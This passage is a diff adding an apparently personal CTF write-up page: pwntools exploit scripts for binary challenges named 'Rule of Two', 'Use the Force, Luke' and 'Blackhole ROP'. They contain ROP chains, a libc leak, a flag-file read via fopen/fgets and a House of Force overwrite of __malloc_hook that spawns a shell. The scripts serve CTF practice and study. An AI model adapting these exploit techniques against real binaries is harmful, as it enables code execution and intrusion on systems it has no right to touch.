+<span class="n">leak</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">rdi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">flag_addr</span><span class="p">)</span>
+<span class="n">leak</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">rsi_r15</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">leak</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">syscall</span><span class="p">)</span>
+
+<span class="c1"># read
+</span><span class="n">leak</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">rax</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">leak</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">rdi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
+<span class="n">leak</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">rsi_r15</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">bss_addr</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">leak</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">rdx</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x100</span><span class="p">)</span>
+<span class="n">leak</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">syscall</span><span class="p">)</span>
+
+<span class="c1"># write
+# leak += p64(rax) + p64(1)
+# leak += p64(rdi) + p64(1)
+# leak += p64(rsi_r15) + p64(bss_addr) + p64(0)
+# leak += p64(rdx) + p64(0x100)
+# leak += p64(syscall)
+</span><span class="n">leak</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">rdi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">bss_addr</span><span class="p">)</span>
+<span class="n">leak</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">puts_plt</span><span class="p">)</span>
+<span class="n">leak</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">vuln_addr</span><span class="p">)</span>
+
+<span class="n">sla</span><span class="p">(</span><span class="s">'Tell me to do something &gt;&gt;&gt;'</span><span class="p">,</span> <span class="n">leak</span><span class="p">)</span>
+
+<span class="k">print</span><span class="p">(</span><span class="n">rls</span><span class="p">(</span><span class="mi">3</span><span class="p">))</span>
+
+<span class="c1"># mark, learn syscall and orw
+</span></code></pre></div></div>
+
+<h2 id="rule-of-two">Rule of Two</h2>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">os</span> <span class="kn">import</span> <span class="n">system</span>
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">from</span> <span class="nn">LibcSearcher</span> <span class="kn">import</span> <span class="n">LibcSearcher</span>
+<span class="kn">from</span> <span class="nn">sys</span> <span class="kn">import</span> <span class="n">argv</span>
+
+<span class="n">context</span><span class="p">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">'debug'</span>
+<span class="n">context</span><span class="p">.</span><span class="n">os</span> <span class="o">=</span> <span class="s">'linux'</span>
+<span class="n">context</span><span class="p">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s">'amd64'</span>
+<span class="n">context</span><span class="p">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s">'tmux'</span><span class="p">,</span><span class="s">'splitw'</span><span class="p">,</span><span class="s">'-h'</span><span class="p">]</span>
+
+<span class="n">binary</span> <span class="o">=</span> <span class="s">'./vader'</span>
+<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">binary</span><span class="p">)</span>
+<span class="n">libc_path</span> <span class="o">=</span> <span class="s">'/glibc/buuoj-libc/2.23-amd64/libc-2.23.so'</span>
+<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">libc_path</span><span class="p">)</span>
+<span class="k">if</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s">'r'</span><span class="p">:</span>
+        <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">'0.cloud.chals.io'</span><span class="p">,</span> <span class="mi">20712</span><span class="p">)</span>
+<span class="k">else</span><span class="p">:</span>
+        <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="n">binary</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">ret2libc</span><span class="p">(</span><span class="n">leak_addr</span><span class="p">,</span> <span class="n">pattern</span><span class="p">,</span> <span class="n">path</span><span class="o">=</span><span class="s">''</span><span class="p">):</span>
+        <span class="k">if</span> <span class="n">path</span> <span class="o">==</span> <span class="s">''</span><span class="p">:</span>
+                <span class="n">libc</span> <span class="o">=</span> <span class="n">LibcSearcher</span><span class="p">(</span><span class="n">pattern</span><span class="p">,</span> <span class="n">leak_addr</span><span class="p">)</span>
+                <span class="n">base</span> <span class="o">=</span> <span class="n">leak_addr</span> <span class="o">-</span> <span class="n">libc</span><span class="p">.</span><span class="n">dump</span><span class="p">(</span><span class="n">pattern</span><span class="p">)</span>
+                <span class="n">system</span> <span class="o">=</span> <span class="n">base</span> <span class="o">+</span> <span class="n">libc</span><span class="p">.</span><span class="n">dump</span><span class="p">(</span><span class="s">'system'</span><span class="p">)</span>
+                <span class="n">binsh</span> <span class="o">=</span> <span class="n">base</span> <span class="o">+</span> <span class="n">libc</span><span class="p">.</span><span class="n">dump</span><span class="p">(</span><span class="s">'str_bin_sh'</span><span class="p">)</span>
+        <span class="k">else</span><span class="p">:</span>
+                <span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">path</span><span class="p">)</span>
+                <span class="n">base</span> <span class="o">=</span> <span class="n">leak_addr</span> <span class="o">-</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="n">pattern</span><span class="p">]</span>
+                <span class="n">system</span> <span class="o">=</span> <span class="n">base</span> <span class="o">+</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="s">'system'</span><span class="p">]</span>
+                <span class="n">binsh</span> <span class="o">=</span> <span class="n">base</span> <span class="o">+</span> <span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">search</span><span class="p">(</span><span class="sa">b</span><span class="s">'/bin/sh'</span><span class="p">))</span>
+
+        <span class="k">return</span> <span class="n">system</span><span class="p">,</span> <span class="n">binsh</span>
+
+<span class="n">s</span>       <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+<span class="n">sa</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">delim</span><span class="p">,</span><span class="n">data</span>         <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">delim</span><span class="p">),</span> <span class="n">data</span><span class="p">)</span>
+<span class="n">sl</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+<span class="n">sla</span>     <span class="o">=</span> <span class="k">lambda</span> <span class="n">delim</span><span class="p">,</span><span class="n">data</span>         <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">delim</span><span class="p">),</span> <span class="n">data</span><span class="p">)</span>
+<span class="n">r</span>       <span class="o">=</span> <span class="k">lambda</span> <span class="n">num</span><span class="o">=</span><span class="mi">4096</span>           <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="n">num</span><span class="p">)</span>
+<span class="n">ru</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">delims</span>             <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="n">delims</span><span class="p">)</span>
+<span class="n">rl</span>      <span class="o">=</span> <span class="k">lambda</span>                    <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">()</span>
+<span class="n">rls</span>     <span class="o">=</span> <span class="k">lambda</span> <span class="n">num</span><span class="o">=</span><span class="mi">1</span>              <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">recvlines</span><span class="p">(</span><span class="n">num</span><span class="p">)</span>
+<span class="n">itr</span>     <span class="o">=</span> <span class="k">lambda</span>                    <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+<span class="n">uu32</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">u32</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">))</span>
+<span class="n">uu64</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">u64</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">))</span>
+
+<span class="k">def</span> <span class="nf">dbg</span><span class="p">():</span>
+        <span class="n">gdb</span><span class="p">.</span><span class="n">attach</span><span class="p">(</span><span class="n">p</span><span class="p">)</span>
+        <span class="n">pause</span><span class="p">()</span>
+
+<span class="k">def</span> <span class="nf">add</span><span class="p">(</span><span class="n">size</span><span class="p">):</span>
+        <span class="n">sla</span><span class="p">(</span><span class="s">':'</span><span class="p">,</span> <span class="s">'1'</span><span class="p">)</span>
+        <span class="n">sla</span><span class="p">(</span><span class="s">':'</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>
+
+<span class="k">def</span> <span class="nf">edit</span><span class="p">(</span><span class="n">index</span><span class="p">,</span> <span class="n">content</span><span class="p">):</span>
+        <span class="n">sla</span><span class="p">(</span><span class="s">':'</span><span class="p">,</span> <span class="s">'2'</span><span class="p">)</span>
+        <span class="n">sla</span><span class="p">(</span><span class="s">':'</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>
+        <span class="n">sla</span><span class="p">(</span><span class="s">':'</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">content</span><span class="p">)))</span>
+        <span class="n">sa</span><span class="p">(</span><span class="s">':'</span><span class="p">,</span> <span class="n">content</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">free</span><span class="p">(</span><span class="n">index</span><span class="p">):</span>
+        <span class="n">sla</span><span class="p">(</span><span class="s">':'</span><span class="p">,</span> <span class="s">'3'</span><span class="p">)</span>
+        <span class="n">sla</span><span class="p">(</span><span class="s">':'</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>
+
+<span class="k">def</span> <span class="nf">show</span><span class="p">(</span><span class="n">index</span><span class="p">):</span>
+        <span class="n">sla</span><span class="p">(</span><span class="s">':'</span><span class="p">,</span> <span class="s">'4'</span><span class="p">)</span>
+        <span class="n">sla</span><span class="p">(</span><span class="s">':'</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>
+
+<span class="c1"># rdi   rsi   rdx   rcx   r8    r9
+</span>
+<span class="n">rdi</span> <span class="o">=</span> <span class="mh">0x40165b</span>
+<span class="n">rsi_r15</span> <span class="o">=</span> <span class="mh">0x401659</span>
+<span class="n">rdx</span> <span class="o">=</span> <span class="mh">0x00000000004011ce</span>
+<span class="n">rcx_r8</span> <span class="o">=</span> <span class="mh">0x00000000004011d8</span>
+<span class="n">bss_addr</span> <span class="o">=</span> <span class="mh">0x405000</span>
+<span class="n">main_addr</span> <span class="o">=</span> <span class="mh">0x4015B5</span>
+<span class="n">fgets_addr</span> <span class="o">=</span> <span class="mh">0x401060</span>
+<span class="n">stdin_off</span> <span class="o">=</span> <span class="mh">0x405070</span>
+<span class="n">fopen_addr</span> <span class="o">=</span> <span class="mh">0x401080</span>
+<span class="n">r_mode_addr</span> <span class="o">=</span> <span class="mh">0x402EE0</span>
+<span class="n">puts_addr</span> <span class="o">=</span> <span class="mh">0x401030</span>
+<span class="n">a_flag_txt</span> <span class="o">=</span> <span class="mh">0x402EE2</span>
+<span class="n">leave_ret</span> <span class="o">=</span> <span class="mh">0x4015F8</span>
+<span class="n">rbp</span> <span class="o">=</span> <span class="mh">0x40116d</span>
+<span class="n">ret</span> <span class="o">=</span> <span class="mh">0x401016</span>
+<span class="n">elf_got_put</span> <span class="o">=</span> <span class="mh">0x405018</span>
+
+<span class="c1"># leak stdin
+</span><span class="n">pay1</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'b'</span><span class="o">*</span><span class="p">(</span><span class="mh">0x20</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">bss_addr</span><span class="o">+</span><span class="mh">0x500</span><span class="o">+</span><span class="mh">0x20</span><span class="p">)</span> 
+<span class="n">pay1</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">rdi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">stdin_off</span><span class="p">)</span> 
+<span class="n">pay1</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">puts_addr</span><span class="p">)</span>
+<span class="n">pay1</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">main_addr</span><span class="p">)</span>
+
+<span class="n">sla</span><span class="p">(</span><span class="s">'Now I am the master &gt;&gt;&gt; '</span><span class="p">,</span> <span class="n">pay1</span><span class="p">)</span>
+<span class="n">stdin_got</span> <span class="o">=</span> <span class="n">uu64</span><span class="p">(</span><span class="n">ru</span><span class="p">(</span><span class="s">'</span><span class="se">\x7f</span><span class="s">'</span><span class="p">)[</span><span class="o">-</span><span class="mi">6</span><span class="p">:])</span>
+<span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">'stdin_got '</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">stdin_got</span><span class="p">))</span>
+<span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">'pay= '</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">pay1</span><span class="p">))</span>
+
+<span class="c1"># read sith.txt to bss
+</span><span class="n">pay2</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'b'</span><span class="o">*</span><span class="p">(</span><span class="mh">0x20</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">bss_addr</span><span class="o">+</span><span class="mh">0x500</span><span class="o">+</span><span class="mh">0x20</span><span class="p">)</span>
+<span class="n">pay2</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">rdi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">bss_addr</span><span class="o">+</span><span class="mh">0x600</span><span class="p">)</span> 
+<span class="n">pay2</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">rsi_r15</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x10</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">pay2</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">rdx</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">stdin_got</span><span class="p">)</span>
+<span class="n">pay2</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">fgets_addr</span><span class="p">)</span>
+
+<span class="c1"># open sith.txt
+</span><span class="n">pay2</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">rdi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">bss_addr</span><span class="o">+</span><span class="mh">0x600</span><span class="p">)</span> 
+<span class="n">pay2</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">rsi_r15</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">r_mode_addr</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">pay2</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">fopen_addr</span><span class="p">)</span>
+
+<span class="c1"># read sith.txt and print flag
+</span><span class="n">pay2</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">rbp</span><span class="p">)</span>
+<span class="n">pay2</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">bss_addr</span><span class="o">+</span><span class="mh">0x800</span><span class="o">+</span><span class="mh">0x30</span><span class="p">)</span>
+<span class="n">pay2</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x40155E</span><span class="p">)</span>
+
+<span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">'len(pay2) '</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">pay2</span><span class="p">)))</span>
+<span class="n">sla</span><span class="p">(</span><span class="s">'Now I am the master &gt;&gt;&gt; '</span><span class="p">,</span> <span class="n">pay2</span><span class="p">)</span>
+
+<span class="n">sl</span><span class="p">(</span><span class="sa">b</span><span class="s">'sith.txt</span><span class="se">\x00</span><span class="s">'</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="n">rls</span><span class="p">(</span><span class="mi">2</span><span class="p">))</span>
+
+<span class="c1"># mark, learn orw
+</span></code></pre></div></div>
+
+<h2 id="use-the-force-luke">Use the Force, Luke</h2>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">from</span> <span class="nn">sys</span> <span class="kn">import</span> <span class="n">argv</span>
+
+<span class="n">context</span><span class="p">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">'debug'</span>
+<span class="n">context</span><span class="p">.</span><span class="n">os</span> <span class="o">=</span> <span class="s">'linux'</span>
+<span class="n">context</span><span class="p">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s">'amd64'</span>
+<span class="n">context</span><span class="p">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s">'tmux'</span><span class="p">,</span><span class="s">'splitw'</span><span class="p">,</span><span class="s">'-h'</span><span class="p">]</span>
+
+<span class="n">binary</span> <span class="o">=</span> <span class="s">'./force'</span>
+<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">binary</span><span class="p">)</span>
+<span class="n">libc_path</span> <span class="o">=</span> <span class="s">'./.glibc/glibc_2.28_no-tcache/libc.so.6'</span>
+<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">libc_path</span><span class="p">)</span>
+<span class="k">if</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s">'r'</span><span class="p">:</span>
+        <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">'0.cloud.chals.io'</span><span class="p">,</span> <span class="mi">11996</span><span class="p">)</span>
+<span class="k">else</span><span class="p">:</span>
+        <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="n">binary</span><span class="p">)</span>
+
+<span class="n">s</span>       <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+<span class="n">sa</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">delim</span><span class="p">,</span><span class="n">data</span>         <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">delim</span><span class="p">),</span> <span class="n">data</span><span class="p">)</span>
+<span class="n">sl</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+<span class="n">sla</span>     <span class="o">=</span> <span class="k">lambda</span> <span class="n">delim</span><span class="p">,</span><span class="n">data</span>         <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">delim</span><span class="p">),</span> <span class="n">data</span><span class="p">)</span>
+<span class="n">r</span>       <span class="o">=</span> <span class="k">lambda</span> <span class="n">num</span><span class="o">=</span><span class="mi">4096</span>           <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="n">num</span><span class="p">)</span>
+<span class="n">ru</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">delims</span>             <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="n">delims</span><span class="p">)</span>
+<span class="n">rl</span>      <span class="o">=</span> <span class="k">lambda</span>                    <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">()</span>
+<span class="n">rls</span>     <span class="o">=</span> <span class="k">lambda</span> <span class="n">num</span><span class="o">=</span><span class="mi">1</span>              <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">recvlines</span><span class="p">(</span><span class="n">num</span><span class="p">)</span>
+<span class="n">itr</span>     <span class="o">=</span> <span class="k">lambda</span>                    <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+<span class="n">uu32</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">u32</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">))</span>
+<span class="n">uu64</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">u64</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">))</span>
+
+<span class="k">def</span> <span class="nf">dbg</span><span class="p">():</span>
+        <span class="n">gdb</span><span class="p">.</span><span class="n">attach</span><span class="p">(</span><span class="n">p</span><span class="p">)</span>
+        <span class="n">pause</span><span class="p">()</span>
+
+<span class="k">def</span> <span class="nf">add</span><span class="p">(</span><span class="n">size</span><span class="p">,</span> <span class="n">cont</span><span class="p">):</span>
+        <span class="n">sla</span><span class="p">(</span><span class="s">'(2) Surrender</span><span class="se">\n</span><span class="s">'</span><span class="p">,</span> <span class="s">'1'</span><span class="p">)</span>
+        <span class="n">sla</span><span class="p">(</span><span class="s">'How many midi-chlorians?: '</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>
+        <span class="n">sa</span><span class="p">(</span><span class="s">'What do you feel?: '</span><span class="p">,</span> <span class="n">cont</span><span class="p">)</span>
+
+<span class="n">ru</span><span class="p">(</span><span class="s">'You feel a system at '</span><span class="p">)</span>
+<span class="n">system_addr</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">ru</span><span class="p">(</span><span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">)[:</span><span class="o">-</span><span class="mi">1</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span>
+<span class="n">ru</span><span class="p">(</span><span class="s">'You feel something else at '</span><span class="p">)</span>
+<span class="n">chunk0_addr</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">ru</span><span class="p">(</span><span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">)[:</span><span class="o">-</span><span class="mi">1</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span>
+
+<span class="n">malloc_hook</span> <span class="o">=</span> <span class="n">system_addr</span> <span class="o">-</span> <span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'system'</span><span class="p">]</span> <span class="o">+</span> <span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'__malloc_hook'</span><span class="p">]</span>
+<span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">'system addr '</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">system_addr</span><span class="p">))</span>
+<span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">'chunk0 addr '</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">chunk0_addr</span><span class="p">))</span>
+<span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">'malloc hook '</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">malloc_hook</span><span class="p">))</span>
+<span class="c1"># dbg()
+</span>
+<span class="c1"># overwrite the top chunk to a huge size
+</span><span class="n">add</span><span class="p">(</span><span class="mh">0x90</span><span class="p">,</span> <span class="sa">b</span><span class="s">'a'</span><span class="o">*</span><span class="mh">0x98</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0xffffffffffffffff</span><span class="p">))</span>
+<span class="c1"># dbg()
+</span>
+<span class="c1"># move the top chunk
+</span><span class="n">fake_size</span> <span class="o">=</span> <span class="n">malloc_hook</span> <span class="o">-</span> <span class="mh">0x10</span> <span class="o">-</span> <span class="p">(</span><span class="n">chunk0_addr</span> <span class="o">+</span> <span class="mh">0x90</span> <span class="o">+</span> <span class="mh">0x10</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x10</span>
+<span class="n">add</span><span class="p">(</span><span class="n">fake_size</span><span class="p">,</span> <span class="sa">b</span><span class="s">'/bin/sh</span><span class="se">\x00</span><span class="s">'</span><span class="p">)</span>
+<span class="c1"># dbg()
+</span>
+<span class="c1"># overwrite the malloc_hook to system
+</span><span class="n">add</span><span class="p">(</span><span class="mh">0x10</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">system_addr</span><span class="p">))</span>
+<span class="n">binsh_addr</span> <span class="o">=</span> <span class="n">chunk0_addr</span> <span class="o">+</span> <span class="mh">0x90</span> <span class="o">+</span> <span class="mh">0x10</span> <span class="o">+</span> <span class="mh">0x10</span>
+<span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">'binsh_addr '</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">binsh_addr</span><span class="p">))</span>
+<span class="c1"># dbg()
+</span>
+<span class="c1"># send the address of binsh
+</span><span class="n">add</span><span class="p">(</span><span class="n">binsh_addr</span><span class="p">,</span> <span class="sa">b</span><span class="s">'cat flag.txt</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
+<span class="c1"># dbg()
+</span>
+<span class="n">itr</span><span class="p">()</span>
+
+<span class="c1"># mark, learn house of force
+</span></code></pre></div></div>
+
+<h2 id="blackhole-rop">Blackhole ROP</h2>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">from</span> <span class="nn">LibcSearcher</span> <span class="kn">import</span> <span class="n">LibcSearcher</span>
+<span class="kn">from</span> <span class="nn">sys</span> <span class="kn">import</span> <span class="n">argv</span>
+
+<span class="c1"># context.log_level = 'debug'
+</span><span class="n">context</span><span class="p">.</span><span class="n">os</span> <span class="o">=</span> <span class="s">'linux'</span>
+<span class="n">context</span><span class="p">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s">'amd64'</span>
+<span class="n">context</span><span class="p">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s">'tmux'</span><span class="p">,</span><span class="s">'splitw'</span><span class="p">,</span><span class="s">'-h'</span><span class="p">]</span>
+
+<span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">'0.cloud.chals.io'</span><span class="p">,</span> <span class="mi">12655</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">ret2libc</span><span class="p">(</span><span class="n">leak_addr</span><span class="p">,</span> <span class="n">pattern</span><span class="p">,</span> <span class="n">path</span><span class="o">=</span><span class="s">''</span><span class="p">):</span>
